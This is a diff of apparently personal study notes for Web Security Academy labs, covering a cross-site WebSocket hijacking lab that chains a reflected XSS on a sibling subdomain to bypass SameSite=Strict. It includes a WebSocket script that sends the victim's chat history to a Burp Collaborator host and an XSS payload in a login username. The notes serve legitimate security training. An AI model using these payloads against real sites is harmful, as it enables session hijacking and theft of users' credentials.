@@ -1756,11 +1756,11 @@ email=wiener@normal-user.com
     `document.cookie = "session_id=malicious_value; SameSite=None; Secure";`
   -  vulnerable to cross-site WebSocket hijacking (CSWSH)
   -  Use exploit server to perform a CSWSH attack that **exfiltrates the victim's chat history** to the default Burp Collaborator
-  -  Study the live chat feature
+  -  **Study the live chat feature**
      - GET /chat > no CSRF token/cookie  > may vulnerable to CSWSH
      - Go to proxy WebSockets history > refresh > browser sends a READT message to server and **respond with entire chat history**   
-  -  Confirm the CSWSH vulnerability
-     - Copy Collaborator > store > view the exploit
+  -  **Confirm the CSWSH vulnerability**
+     - Copy Collaborator > store > view the exploit   
      ```
      <script>
           var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
@@ -1772,15 +1772,15 @@ email=wiener@normal-user.com
           };
      </script>
      ```
-     - Poll now > received a new live chat connection with the target site
-     - Go to latest GET .chat triggered by your script   > noticed the session cookies was not sent with the request > response specifies SameSite=Strict   
-  -  Identify a reflected XSS in sudomain
+     - Poll now > received a new live chat connection with the target site   
+     - Go to latest GET /chat triggered by your script   > noticed the session cookies was not sent with the request > response specifies SameSite=Strict   
+  -  **Identify a reflected XSS in sudomain**   
      - In the response of GET /resources/js/chat.js > Access-Control-Allow-Origin: https://**cms-**0a540012047094f381f67fc5001d00ea.web-security-academy.net   > discover subdomain
      - A **reflected XSS exploited in username** textbox `<p>Invalid username: <script>alert(1)</script></p>`
      - **POST /login** request containing the XSS payload > repeater  > **change request method**   
        `GET /login?username=<script>alert(1)</script>&password=123456`
      - Copy URL > `https://cms-0a540012047094f381f67fc5001d00ea.web-security-academy.net/login?username=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&password=123456` > confirm xss exploit   
-  -  Bypass the SameSite restriction
+  -  **Bypass the SameSite restriction**
      - **Recreate the CSWSH script**
        ```
        <script>
@@ -1807,12 +1807,9 @@ email=wiener@normal-user.com
      - Deliver the exploit to the victim
      - Collaborator > Poll now
      - study the HTTP request to collaborator (Password inside of chat history)   
-- dd
-- dd
-- dd
-- dd
-- dd
-
+- SameSite Lax bypass via cookie refresh   
+- CSRF where Referer validation depends on header being present   
+- CSRF with broken Referer validation   
 
 ## CORS (Cross-Origin Resource Sharing)
 Details about CORS...
